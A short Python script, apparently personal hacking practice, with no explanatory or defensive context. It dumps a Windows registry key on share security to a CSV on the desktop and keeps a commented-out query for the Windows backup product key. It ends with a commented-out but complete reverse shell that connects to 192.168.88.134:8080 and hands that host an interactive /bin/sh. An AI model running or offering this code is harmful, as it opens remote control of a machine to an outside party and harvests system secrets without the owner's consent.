import os
UserName = os.popen('echo %username%').read().rstrip()
filepath = "C:\\Users\\"+UserName+"\\Desktop\\"
filename = "windows_key.csv"
file = filepath+filename
f = open(file,"w+")

# windowsKey = os.popen('reg query "hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform"  /v BackupProductKeyDefault').read()
windowsKey = os.popen('reg query "hklm\SYSTEM\CurrentControlSet\Services\LanmanServer\Shares\Security"').read()
f.write(str(windowsKey))
# print(windowsKey)

# # # print("h"+UserName+"l"+UserName)
# import socket
# import subprocess
# import os
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.connect(("192.168.88.134", 8080))
# os.dup2(s.fileno(), 0)
# os.dup2(s.fileno(), 1)
# os.dup2(s.fileno(), 2)
# p = subprocess.call(["/bin/sh", "-i"])
